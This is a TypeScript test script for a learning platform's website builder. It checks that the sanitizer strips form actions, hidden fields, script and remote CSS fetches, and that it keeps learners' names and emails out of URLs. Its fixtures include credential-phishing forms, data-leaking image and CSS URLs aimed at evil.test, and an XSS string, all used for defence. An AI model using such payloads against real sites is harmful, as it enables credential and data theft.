/**
 * The website builder's rules.
 *
 * A site page is HTML an academy wrote, shown to the public on the same origin
 * as the staff admin. These checks are the ones whose failure would be a
 * security problem or a locked-out academy, not a styling bug:
 *
 *  - a designed page can declare the platform's forms, and nothing else about
 *    them: not where they post, not hidden fields, not pre-filled values;
 *  - a password field exists only on the sign-in and register pages;
 *  - none of this leaks into lessons or certificates;
 *  - a visitor's name and email are shown to them as text and can never become
 *    part of a URL or a stylesheet;
 *  - a sign-in page without a working sign-in form cannot be published.
 *
 * Pure: no database, no network.
 *
 *   npm run verify:site-builder
 */
import { sanitizeSiteDocument } from "../lib/content/sanitize-site-document";
import { sanitizeHtml, sanitizeHtmlWithStyles } from "../lib/content/sanitize-html";
import { renderCssTemplate, renderTemplate, type VariableContext } from "../lib/site/template";
import {
  SITE_FORMS,
  SITE_PAGE_KINDS,
  findSiteForms,
  formAllowedOn,
  kindAllowsPassword,
  pageKindProblems,
  type SitePageKind,
} from "../lib/site/site-api";
import { defaultFooterHtml, defaultHeaderHtml, kindStarter } from "../lib/site/kind-starters";
import { analyzeSource, publishProblems } from "../lib/site/source";
import { SITE_VARIABLES, sampleContext, variablesForKind } from "../lib/site/variables";
import { slugify } from "../lib/site/pages";
import { ORIGINAL_TEMPLATE_IDS, PAGE_TEMPLATES, templatesForKind } from "../lib/site/page-templates";
import { SNIPPETS, sectionLibrary, sectionWithStyles } from "../lib/site/html-sections";
import {
  deleteSection,
  duplicateSection,
  insertSection,
  listSections,
  moveSection,
} from "../lib/site/section-tools";
import { previewDocument } from "../lib/site/preview-document";

let failed = 0;
let total = 0;

function check(label: string, actual: unknown, expected: unknown) {
  total++;
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  const ok = a === e;
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${ok ? "" : `\n      got  ${a}\n      want ${e}`}`);
}

const site = (html: string, kind: SitePageKind = "PAGE") => sanitizeSiteDocument(html, "t", { kind }).html;
const KINDS = SITE_PAGE_KINDS.map((k) => k.kind);

/* -------------------------------------------------------------------------- */
/* Forms are declarations                                                      */
/* -------------------------------------------------------------------------- */

const hostileLogin =
  '<form data-lms-form="login" action="https://evil.test/steal" method="post" onsubmit="x()" target="_blank">' +
  '<input name="email" type="email" value="pre@filled.test" pattern=".*" required>' +
  '<input name="password" type="password" formaction="https://evil.test" form="other">' +
  '<input type="hidden" name="token" value="x"><input name="upload" type="file"><input type="checkbox" name="remember">' +
  '<input name="made[up]" type="text">' +
  '<button formaction="https://evil.test" type="submit" name="go" value="1">Go</button><p data-lms-error></p></form>';

check(
  "a sign-in form keeps its fields and loses everything that says where or what it sends",
  site(hostileLogin, "LOGIN"),
  '<form data-lms-form="login"><input name="email" type="email" required /><input name="password" type="password" /><input type="text" /><button type="submit">Go</button><p data-lms-error></p></form>'
);

check(
  "on any other page the same markup is a box with no password field",
  site(hostileLogin, "PAGE"),
  '<div><input name="email" type="email" required /><input type="text" /><button type="submit">Go</button><p data-lms-error></p></div>'
);

check(
  "the search box is the one form with an address, and the platform chooses it",
  site('<form data-lms-form="search" action="https://evil.test" method="post"><input name="q" type="search"><button>Find</button></form>'),
  '<form data-lms-form="search" action="/courses" method="get"><input name="q" type="search" /><button type="submit">Find</button></form>'
);

check(
  "a form the platform does not run is not a form",
  site('<form action="https://evil.test/pay" data-lms-form="payment"><input name="card"><button>Pay</button></form>'),
  '<div><input type="text" /><button type="submit">Pay</button></div>'
);

check(
  "a form with no declaration is not a form either",
  site('<form action="https://evil.test"><input name="email" type="email"></form>'),
  '<div><input name="email" type="email" /></div>'
);

check(
  "a button can only submit or do nothing",
  site('<button type="reset">a</button><button type="BUTTON">b</button><button>c</button>'),
  '<button type="submit">a</button><button type="button">b</button><button type="submit">c</button>'
);

for (const kind of KINDS) {
  const out = site(hostileLogin, kind);
  check(
    `${kind}: a password field appears only where a password is expected`,
    out.includes('type="password"'),
    kindAllowsPassword(kind)
  );
  check(
    `${kind}: nothing an author wrote decides where a form posts`,
    /evil\.test|formaction|onsubmit|value=|pattern=|type="hidden"|type="file"/.test(out),
    false
  );
}

check(
  "the header and footer are ordinary pages: no credential form survives in them",
  [site(hostileLogin, "PAGE").includes("data-lms-form"), kindAllowsPassword("PAGE")],
  [false, false]
);

/* -------------------------------------------------------------------------- */
/* None of it reaches lessons or certificates                                  */
/* -------------------------------------------------------------------------- */

check("a form in a lesson is still removed whole", sanitizeHtml(hostileLogin), "Go<p data-lms-error></p>");
check(
  "…including the search box",
  sanitizeHtml('<form data-lms-form="search"><input name="q" type="search"><button>Find</button></form>'),
  "Find"
);

/* -------------------------------------------------------------------------- */
/* The catalogue is self-consistent                                            */
/* -------------------------------------------------------------------------- */

for (const form of SITE_FORMS) {
  const home: SitePageKind = form.allowedOn === "any" ? "PAGE" : form.allowedOn[0];
  const found = findSiteForms(site(form.example, home));
  check(
    `the ${form.kind} example survives on its own page with every field and a button`,
    [found.length, found[0]?.fields, found[0]?.hasSubmit],
    [1, form.fields.filter((f) => form.example.includes(`name="${f.name}"`)).map((f) => f.name), true]
  );
  check(
    `the ${form.kind} example names only fields from its own list`,
    found[0]?.fields.every((name) => form.fields.some((f) => f.name === name)),
    true
  );
}

check(
  "credential forms are confined to their own page",
  SITE_FORMS.filter((f) => f.fields.some((x) => x.type === "password")).map((f) => [f.kind, f.allowedOn]),
  [
    ["login", ["LOGIN"]],
    ["register", ["REGISTER"]],
  ]
);

check(
  "a special page's stored slug is one no author can type",
  SITE_PAGE_KINDS.filter((k) => k.reservedSlug).map((k) => slugify(k.reservedSlug!) === k.reservedSlug),
  SITE_PAGE_KINDS.filter((k) => k.reservedSlug).map(() => false)
);
check(
  "…and no two kinds share one",
  new Set(SITE_PAGE_KINDS.map((k) => k.reservedSlug)).size,
  SITE_PAGE_KINDS.length
);

/* -------------------------------------------------------------------------- */
/* A special page must work before it goes live                                */
/* -------------------------------------------------------------------------- */

for (const def of SITE_PAGE_KINDS) {
  if (def.kind === "PAGE") continue;
  const starter = kindStarter(def.kind);
  check(`the ${def.kind} starter can be published as it is`, publishProblems(starter.html, def.kind), []);
  check(
    `the ${def.kind} starter loses nothing to the sanitizer and leaves no unresolved tag`,
    [
      analyzeSource(starter.html, "t", def.kind).removedTagCount,
      /\{\{|\}\}/.test(renderTemplate(starter.html, sampleContext() as VariableContext)),
    ],
    [0, false]
  );
  if (def.requiredForm) {
    check(
      `${def.kind}: a page without its form cannot be published, and is told why`,
      publishProblems("<h1>Welcome</h1><p>Nothing to fill in.</p>", def.kind).length > 0,
      true
    );
  }
}

check(
  "a sign-in form missing its password field is named as the problem",
  pageKindProblems("LOGIN", site('<form data-lms-form="login"><input name="email" type="email"><button>Go</button></form>', "LOGIN")),
  ['The sign-in form is missing its "Password" field (name="password").']
);
check(
  "a sign-in form with no button is named as the problem",
  pageKindProblems(
    "LOGIN",
    site('<form data-lms-form="login"><input name="email" type="email"><input name="password" type="password"></form>', "LOGIN")
  ),
  ["The sign-in form has no submit button."]
);
check(
  "a register form pasted onto the sign-in page does not count as a sign-in form",
  publishProblems(SITE_FORMS.find((f) => f.kind === "register")!.example, "LOGIN").length > 0,
  true
);
// A sign-in page is judged as the person it is for gets it: signed out.
check(
  "a form shown to signed-out visitors counts",
  publishProblems(
    `{{#if user.isAuthenticated}}<p>Already in.</p>{{else}}${SITE_FORMS[0].example}{{/if}}`,
    "LOGIN"
  ),
  []
);
check(
  "a form shown only to people already signed in does not",
  publishProblems(`{{#if user.isAuthenticated}}${SITE_FORMS[0].example}{{/if}}`, "LOGIN").length > 0,
  true
);
check("an ordinary page has nothing to prove", publishProblems("<p>Hello</p>", "PAGE"), []);

/* -------------------------------------------------------------------------- */
/* Personal data stays out of URLs and stylesheets                             */
/* -------------------------------------------------------------------------- */

const learner: VariableContext = { user: { name: "Ada Lovelace", email: "ada@example.test", isAuthenticated: true } };

check(
  "a learner's name and email are shown to them as text",
  renderTemplate("<p>Hi {{ user.name }} ({{user.email}})</p>", learner),
  "<p>Hi Ada Lovelace (ada@example.test)</p>"
);
check(
  "…but never inside a tag, where they could become part of a request",
  renderTemplate(
    '<img src="https://evil.test/?e={{ user.email }}&n={{user.name}}"><a href="/x?{{ user.email }}" title="{{ user.name }}">{{ user.name }}</a>',
    learner
  ),
  '<img src="https://evil.test/?e=&n="><a href="/x?" title="">Ada Lovelace</a>'
);
check(
  "…and never in a stylesheet",
  renderCssTemplate(".a{background:url(https://evil.test/{{ user.email }})} .b::after{content:'{{user.name}}'}", learner),
  ".a{background:url(https://evil.test/)} .b::after{content:''}"
);
check(
  "a condition on being signed in is still allowed anywhere",
  renderTemplate('<div class="{{#if user.isAuthenticated}}in{{else}}out{{/if}}"></div>', learner),
  '<div class="in"></div>'
);
check(
  "markup in a value cannot become markup on the page",
  renderTemplate("<p>{{ user.name }}</p>", { user: { name: '<img src=x onerror="alert(1)">' } }),
  "<p>&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</p>"
);

/* -------------------------------------------------------------------------- */
/* Header, footer and variables                                                */
/* -------------------------------------------------------------------------- */

for (const [name, html] of [
  ["header", defaultHeaderHtml()],
  ["footer", defaultFooterHtml()],
] as const) {
  const analysed = analyzeSource(html, `sl-${name}`);
  check(`the standard ${name}, written out, loses nothing to the sanitizer`, analysed.removedTagCount, 0);
  check(
    `…and resolves every variable it uses`,
    /\{\{|\}\}/.test(renderTemplate(html, sampleContext() as VariableContext)),
    false
  );
}
check(
  "the standard header offers sign in and register to a visitor, and the dashboard to a learner",
  [
    /auth\.loginUrl/.test(defaultHeaderHtml()),
    /auth\.registerUrl/.test(defaultHeaderHtml()),
    /auth\.dashboardUrl/.test(defaultHeaderHtml()),
  ],
  [true, true, true]
);

check(
  "every variable has a sample, so the editor's preview never shows a hole",
  SITE_VARIABLES.filter((v) => v.kind === "list" && (!v.fields || v.fields.length === 0)).map((v) => v.path),
  []
);
check(
  "a course page's variables are offered on a course page and not on the home page",
  [
    variablesForKind("COURSE_DETAIL").some((v) => v.path === "course.title"),
    variablesForKind("PAGE").some((v) => v.path === "course.title"),
    variablesForKind("PAGE").some((v) => v.path === "auth.loginUrl"),
  ],
  [true, false, true]
);
check(
  "every form's page kind exists",
  SITE_FORMS.every((f) => f.allowedOn === "any" || f.allowedOn.every((k) => KINDS.includes(k))) &&
    SITE_PAGE_KINDS.every((k) => !k.requiredForm || SITE_FORMS.some((f) => f.kind === k.requiredForm && formAllowedOn(f, k.kind))),
  true
);

/* -------------------------------------------------------------------------- */
/* Designs                                                                     */
/* -------------------------------------------------------------------------- */

const visitorContext = {
  ...sampleContext(),
  user: { isAuthenticated: false, name: "", email: "" },
} as VariableContext;

/** A hex colour that is a grey, black or white: its channels are (nearly) equal. */
function isNeutral(hex: string): boolean {
  const h = hex.slice(1);
  const full = h.length === 3 ? [...h].map((c) => c + c).join("") : h.slice(0, 6);
  const [r, g, b] = [0, 2, 4].map((i) => parseInt(full.slice(i, i + 2), 16));
  return Math.max(r, g, b) - Math.min(r, g, b) <= 12;
}
/** The one colour that is a meaning, not a brand: the red of a form error. */
const STATUS_HEX = new Set(["#b42318"]);

check("design ids are unique", new Set(PAGE_TEMPLATES.map((t) => t.id)).size, PAGE_TEMPLATES.length);
check(
  "the original design ids still exist",
  ORIGINAL_TEMPLATE_IDS.map((id) => PAGE_TEMPLATES.some((t) => t.id === id)),
  ORIGINAL_TEMPLATE_IDS.map(() => true)
);
check(
  "there are enough designs of each kind to choose between",
  [
    PAGE_TEMPLATES.filter((t) => t.group === "Home").length >= 4,
    templatesForKind("LOGIN").length >= 2,
    templatesForKind("REGISTER").length >= 2,
    templatesForKind("FORGOT_PASSWORD").length >= 1,
    templatesForKind("COURSES").length >= 1,
    templatesForKind("COURSE_DETAIL").length >= 1,
    templatesForKind("PROGRAMME_DETAIL").length >= 1,
    ["about", "contact", "faq", "programmes-overview"].every((id) => PAGE_TEMPLATES.some((t) => t.id === id)),
  ],
  [true, true, true, true, true, true, true, true]
);

for (const template of PAGE_TEMPLATES) {
  const html = template.html();
  const rendered = renderTemplate(html, visitorContext);
  const doc = sanitizeSiteDocument(rendered, "t", { kind: template.kind });
  const sourceCss = [...html.matchAll(/<style\b[^>]*>([\s\S]*?)<\/style>/gi)].map((m) => m[1]).join("\n");

  check(`design ${template.id}: nothing is removed by the sanitizer on its own kind of page`, doc.removedTagCount, 0);
  check(
    `design ${template.id}: every rule of its stylesheet survives`,
    (doc.css.match(/\{/g) ?? []).length,
    (sourceCss.match(/\{/g) ?? []).length
  );
  check(`design ${template.id}: every variable it uses exists`, /\{\{|\}\}/.test(rendered), false);
  check(`design ${template.id}: can be published as a ${template.kind} page`, publishProblems(html, template.kind), []);
  check(
    `design ${template.id}: loads nothing from anywhere else`,
    /(?:src|href)\s*=\s*"(?:https?:)?\/\/|url\(\s*['"]?(?:https?:)?\/\/|@import|@font-face/i.test(html),
    false
  );
  check(
    `design ${template.id}: no brand colour is written in; only neutrals and the error red`,
    [...new Set(html.match(/#[0-9a-fA-F]{3,8}\b/g) ?? [])].filter((hex) => !isNeutral(hex) && !STATUS_HEX.has(hex.toLowerCase())),
    []
  );
  check(
    `design ${template.id}: the preview is the sanitized page, in a document of its own`,
    [
      previewDocument({ source: html, kind: template.kind }, visitorContext).problems,
      previewDocument({ source: html, kind: template.kind }, visitorContext).srcDoc.includes("data-css-scope"),
    ],
    [[], true]
  );
}

check(
  "a home design offers sign in and register, a learner's dashboard, the courses and a search box",
  PAGE_TEMPLATES.filter((t) => t.group === "Home" && t.id.startsWith("home-")).map((t) => {
    const html = t.html();
    return [
      html.includes("{{ auth.registerUrl }}"),
      html.includes("{{ auth.loginUrl }}"),
      html.includes("{{#if user.isAuthenticated}}"),
      html.includes("{{#each courses}}"),
    ].every(Boolean);
  }),
  PAGE_TEMPLATES.filter((t) => t.group === "Home" && t.id.startsWith("home-")).map(() => true)
);
check(
  "at least one home design carries the course search box",
  PAGE_TEMPLATES.some((t) => t.group === "Home" && t.html().includes('data-lms-form="search"')),
  true
);
check(
  "the preview shows what the sanitizer leaves, not what was typed",
  [
    previewDocument({ source: '<p>Hi</p><script>alert(1)</script>', kind: "PAGE" }, visitorContext).srcDoc.includes("alert(1)"),
    previewDocument({ source: SITE_FORMS[0].example, kind: "PAGE" }, visitorContext).srcDoc.includes('type="password"'),
    previewDocument({ source: SITE_FORMS[0].example, kind: "LOGIN" }, visitorContext).srcDoc.includes('type="password"'),
  ],
  [false, false, true]
);

/* -------------------------------------------------------------------------- */
/* Sections                                                                    */
/* -------------------------------------------------------------------------- */

const three = `<style>.a{color:red}</style>

<section id="one">
  <h2>First</h2>
</section>

<!-- a note the author left -->
<section id="two"><h2>Second</h2><img src="/x.png" alt="a > b"></section>

{{#if user.isAuthenticated}}
<section><h2>Third</h2></section>
{{/if}}
`;

check(
  "sections are the top-level pieces of the page; styles and comments are not",
  listSections(three).map((x) => [x.tag, x.label]),
  [
    ["section", "First"],
    ["section", "Second"],
    ["block", "Only if: Is a learner signed in? — Third"],
  ]
);

const movedDown = moveSection(three, 0, 1);
check(
  "moving a section swaps it with its neighbour and touches nothing else",
  [
    listSections(movedDown).map((x) => x.label.slice(0, 6)),
    movedDown.length,
    movedDown.startsWith("<style>.a{color:red}</style>\n\n<section id=\"two\">"),
    movedDown.includes("<!-- a note the author left -->"),
  ],
  [["Second", "First", "Only i"], three.length, true, true]
);
check("moving it back restores the document byte for byte", moveSection(movedDown, 1, -1), three);
check("the first section cannot move up, nor the last one down", [moveSection(three, 0, -1), moveSection(three, 2, 1)], [three, three]);
check("duplicating then deleting the copy restores the document", deleteSection(duplicateSection(three, 1), 2), three);
check(
  "deleting a section leaves the others exactly as they were",
  listSections(deleteSection(three, 1)).map((x) => three.slice(listSections(three).find((y) => y.label === x.label)!.start, listSections(three).find((y) => y.label === x.label)!.end)),
  [three.slice(listSections(three)[0].start, listSections(three)[0].end), three.slice(listSections(three)[2].start, listSections(three)[2].end)]
);
check(
  "inserting puts the new section where it was asked for",
  [
    listSections(insertSection(three, 0, "<section><h2>New</h2></section>")).map((x) => x.label.slice(0, 6)),
    listSections(insertSection(three, null, "<section><h2>New</h2></section>")).map((x) => x.label.slice(0, 6)),
    listSections(insertSection(three, -1, "<section><h2>New</h2></section>")).map((x) => x.label.slice(0, 6)),
  ],
  [
    ["First", "New", "Second", "Only i"],
    ["First", "Second", "Only i", "New"],
    ["New", "First", "Second", "Only i"],
  ]
);
check(
  "a page that is one wrapper is listed by what is inside the wrapper",
  listSections('<div class="wrap">\n  <section><h2>A</h2></section>\n  <section><h2>B</h2></section>\n</div>').map((x) => x.label),
  ["A", "B"]
);
check(
  "a whole document is listed by what is inside its body",
  listSections("<!doctype html><html><head><title>T</title><style>p{}</style></head><body><header><h1>Top</h1></header><main><h2>Mid</h2></main></body></html>").map((x) => x.label),
  ["Top", "Mid"]
);
check("an empty page has no sections, and takes a first one", [listSections(""), listSections(insertSection("", null, "<section><h2>A</h2></section>")).length], [[], 1]);

for (const template of PAGE_TEMPLATES) {
  const html = template.html();
  const count = listSections(html).length;
  if (count < 2) continue;
  check(
    `design ${template.id}: its sections can be reordered and put back without a byte changing`,
    [moveSection(moveSection(html, 0, 1), 1, -1) === html, deleteSection(duplicateSection(html, 0), 1) === html],
    [true, true]
  );
}

check(
  "the section library offers the sections an author expects",
  ["hero", "benefits", "courses", "testimonial", "cta", "faq", "contact"].every((id) => sectionLibrary().some((x) => x.id === id)),
  true
);
for (const snippet of SNIPPETS) {
  const doc = sanitizeSiteDocument(renderTemplate(snippet.html, visitorContext), "t", { kind: "PAGE" });
  check(`section ${snippet.id}: survives the sanitizer whole and resolves its variables`, [doc.removedTagCount, /\{\{/.test(doc.html)], [0, false]);
}
check(
  "a ready-made section brings its stylesheet to a page that lacks it, once",
  [
    sectionWithStyles("<p>mine</p>", SNIPPETS[0].html).includes(".sb-wrap"),
    sectionWithStyles(sectionWithStyles("<p>mine</p>", SNIPPETS[0].html), SNIPPETS[1].html).includes("<style>"),
  ],
  [true, false]
);

/* -------------------------------------------------------------------------- */
/* Nothing pinned to the window; nothing fetched from a password page          */
/* -------------------------------------------------------------------------- */

// A site page is shown around the platform's own controls, so its CSS gets two
// rules a lesson's does not. Both only ever REMOVE declarations.

const styled = (source: string, id: string, kind: SitePageKind = "PAGE") => {
  const doc = sanitizeSiteDocument(source, id, { kind });
  return `${doc.css}\n${doc.html}`.replace(/\s+/g, " ").trim();
};

const PINNED =
  "<style>.a{position:fixed;inset:0;color:red}.b{position:sticky;top:0}.c{position:absolute}.d{position:relative}" +
  ".e{position:var(--p);--p:fixed}@media (min-width:40rem){.f{position:sticky !important;color:blue}}" +
  "@keyframes k{from{position:fixed;opacity:0}to{opacity:1}}</style>" +
  '<div style="position:fixed;inset:0;color:red">x</div><p style="position:sticky;top:0">y</p>';

check(
  "on a page nothing can be pinned to the window, by any spelling — and everything else is kept",
  styled(PINNED, "sp-1"),
  '[data-css-scope="sp-1"] .a { inset: 0; color: red } [data-css-scope="sp-1"] .b { top: 0 } ' +
    '[data-css-scope="sp-1"] .c { position: absolute } [data-css-scope="sp-1"] .d { position: relative } ' +
    '[data-css-scope="sp-1"] .e { --p: fixed } @media (min-width:40rem) { [data-css-scope="sp-1"] .f { color: blue } } ' +
    '@keyframes k { from { opacity: 0 } to { opacity: 1 } } <div style="inset:0;color:red">x</div><p style="top:0">y</p>'
);

check(
  "the site header may stick to the top; it still may not be fixed",
  [
    /position: sticky/.test(styled(PINNED, "sl-header")),
    /position:sticky/.test(styled(PINNED, "sl-header")),
    /position:\s*fixed/.test(styled(PINNED, "sl-header").replace("--p: fixed", "")),
  ],
  [true, true, false]
);
check(
  "the footer is treated like a page, and so is a document that merely says it is one",
  [
    /sticky/.test(styled(PINNED, "sl-footer")),
    /sticky/.test(sanitizeSiteDocument(PINNED, "sl-header", { part: "page" }).css),
    /sticky/.test(sanitizeSiteDocument(PINNED, "anything", { part: "header" }).css),
  ],
  [false, false, true]
);

const FETCHES =
  "<style>.a{background:url(https://evil.test/a.png);color:green}.b{background:url(/img/a.png)}" +
  '.c{background:url("//evil.test/x")}.d{background:image-set("https://evil.test/d.png" 1x)}' +
  ".e{background:u\\72l(https://evil.test/e)}.f{background:url(data:image/png;base64,AAAA) no-repeat;color:blue}" +
  ".g{--bg:url(https://evil.test/g.png);background:var(--bg)}.h{fill:url(#grad)}" +
  "@font-face{font-family:x;src:url(https://evil.test/f.woff2)}</style>" +
  '<p style="background:url(https://evil.test/p.png);color:red">y</p><p style="background:url(./local.png)">z</p>';

for (const kind of ["LOGIN", "REGISTER", "FORGOT_PASSWORD"] as const) {
  const out = styled(FETCHES, "sp-2", kind);
  check(
    `${kind}: a page that asks for a password fetches nothing from anywhere else`,
    [/evil\.test/.test(out), /image-set/.test(out), out.includes("\\")],
    [false, false, false]
  );
  check(
    `${kind}: …while an inline image, a path on this site and a local reference all stay`,
    [
      out.includes("url(/img/a.png)"),
      out.includes("url(data:image/png;base64,AAAA) no-repeat; color: blue"),
      out.includes("url(#grad)"),
      out.includes("url(./local.png)"),
      out.includes("color: green"),
      out.includes('style="color:red"'),
    ],
    [true, true, true, true, true, true]
  );
}
check(
  "an ordinary page keeps its remote background image — the rule is for password pages",
  /url\(https:\/\/evil\.test\/a\.png\)/.test(styled(FETCHES, "sp-3", "PAGE")),
  true
);

check(
  "neither rule reaches a lesson: its styles come out exactly as the shared policy leaves them",
  [
    /position: fixed/.test(sanitizeHtmlWithStyles(PINNED, "l1").css),
    /position: sticky/.test(sanitizeHtmlWithStyles(PINNED, "l1").css),
    sanitizeHtml(PINNED).includes("position:fixed"),
    /evil\.test\/a\.png/.test(sanitizeHtmlWithStyles(FETCHES, "l1").css),
  ],
  [true, true, true, true]
);

// The platform's own designs must not lean on anything these rules remove:
// what the site sanitizer keeps has to be everything the shared one keeps.
const sameAsShared = (source: string, id: string, kind: SitePageKind) =>
  sanitizeSiteDocument(source, id, { kind }).css.replace(/\s+/g, " ").trim() ===
  sanitizeHtmlWithStyles(source, id).css.replace(/\s+/g, " ").trim();

check(
  "no built-in design, starter, section or standard header/footer loses a declaration to them",
  [
    ...PAGE_TEMPLATES.filter((t) => !sameAsShared(renderTemplate(t.html(), visitorContext), "sp-t", t.kind)).map((t) => t.id),
    ...SITE_PAGE_KINDS.filter((k) => k.kind !== "PAGE")
      .filter((k) => !sameAsShared(renderTemplate(kindStarter(k.kind as Exclude<SitePageKind, "PAGE">).html, visitorContext), "sp-t", k.kind))
      .map((k) => `starter:${k.kind}`),
    ...SNIPPETS.filter((snippet) => !sameAsShared(renderTemplate(snippet.html, visitorContext), "sp-t", "PAGE")).map((x) => `section:${x.id}`),
    ...(sameAsShared(renderTemplate(defaultHeaderHtml(), visitorContext), "sl-header", "PAGE") ? [] : ["header"]),
    ...(sameAsShared(renderTemplate(defaultFooterHtml(), visitorContext), "sl-footer", "PAGE") ? [] : ["footer"]),
  ],
  []
);

console.log(failed === 0 ? `\nAll ${total} site-builder checks passed.` : `\n${failed} of ${total} check(s) FAILED.`);
process.exit(failed === 0 ? 0 : 1);
